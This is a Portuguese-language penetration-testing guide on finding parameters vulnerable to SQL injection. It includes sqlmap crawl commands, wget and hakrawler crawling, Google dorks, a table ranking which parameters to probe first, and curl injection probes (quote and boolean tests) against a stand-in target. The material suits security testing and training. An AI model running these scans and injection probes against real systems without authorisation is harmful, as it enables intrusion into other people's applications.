# Descoberta de Parâmetros Injetáveis

## Objetivo
Identificar todos os pontos de entrada de dados na aplicação que podem ser vulneráveis a SQL Injection.

## Ferramentas

### SQLMap — Crawling Automático
```bash
# Crawl básico da aplicação
sqlmap -u "http://alvo.com/" --crawl=3 --batch --random-agent

# Crawl com formulários
sqlmap -u "http://alvo.com/" --crawl=3 --forms --batch

# Crawl profundo com autenticação
sqlmap -u "http://alvo.com/app/" --crawl=5 --forms \
  --cookie="session=abc123" --batch
```

### Burp Suite — Interceptação Manual
1. Navegar pela aplicação com Burp interceptando
2. Enviar todas as requisições para o Intruder ou Repeater
3. Identificar parâmetros GET, POST, Cookies, Cabeçalhos

## Tipos de Parâmetros a Testar

### GET
```
http://alvo.com/produto?id=1
http://alvo.com/busca?q=termo&categoria=2
http://alvo.com/usuario?nome=admin&tipo=premium
```

### POST
```
username=admin&password=123
search=termo&filtro=preco&ordem=asc
```

### Cookies
```
Cookie: sessao=abc123; preferencia=pt-br; usuario_id=42
```

### Cabeçalhos HTTP
```
X-Forwarded-For: 1.2.3.4
User-Agent: Mozilla/5.0
Referer: http://alvo.com/login
```

## Técnicas de Descoberta

### 1. Análise de URLs
- Parâmetros numéricos: `?id=1`, `?pid=42` → alta probabilidade de SQLi
- Parâmetros de categoria: `?cat=5`, `?tipo=produto` → média probabilidade
- Parâmetros de busca: `?q=termo`, `?search=palavra` → verificar

### 2. Spider/Crawler
```bash
# Coletar URLs com parâmetros usando wget
wget -q -O - --spider --recursive --level=3 http://alvo.com/ 2>&1 | \
  grep "http" | grep "?" | sort -u

# Com hakrawler (se disponível)
echo "http://alvo.com" | hakrawler -depth 3 -insecure | grep "?"
```

### 3. Análise de Código Fonte HTML
- Procurar formulários: `<form action="...">`
- Campos ocultos: `<input type="hidden" name="..." value="...">`
- Links com parâmetros: `href="...?param=valor"`

### 4. Google Dork para Parâmetros
```
site:alvo.com inurl:?id=
site:alvo.com inurl:?p=
site:alvo.com inurl:?cat=
site:alvo.com inurl:?page=
```

## Priorização

| Parâmetro | Prioridade | Motivo |
|-----------|-----------|--------|
| `id`, `pid`, `uid` | CRÍTICA | Tipicamente consultas diretas ao BD |
| `cat`, `category` | ALTA | Filtros de categoria em SELECT |
| `search`, `q` | ALTA | Busca textual com LIKE |
| `page`, `p` | MÉDIA | Paginação com LIMIT/OFFSET |
| `lang`, `locale` | MÉDIA | Pode consultar tabelas de idioma |
| `order`, `sort` | MÉDIA | ORDER BY injection possível |
| `token`, `hash` | BAIXA | Geralmente não consultam BD diretamente |

## Verificação Rápida de Injetabilidade

```bash
# Teste simples com aspas
curl "http://alvo.com/produto?id=1'"
curl "http://alvo.com/produto?id=1\""

# Diferença booleana
curl "http://alvo.com/produto?id=1 AND 1=1"
curl "http://alvo.com/produto?id=1 AND 1=2"

# Erro básico
curl "http://alvo.com/produto?id=1'"
```

## Documentar Resultados

Para cada parâmetro identificado, registrar:
- URL completa com parâmetro
- Método HTTP (GET/POST)
- Tipo de dado esperado (int, string, etc.)
- Comportamento com valor inválido
- Comportamento com aspas simples
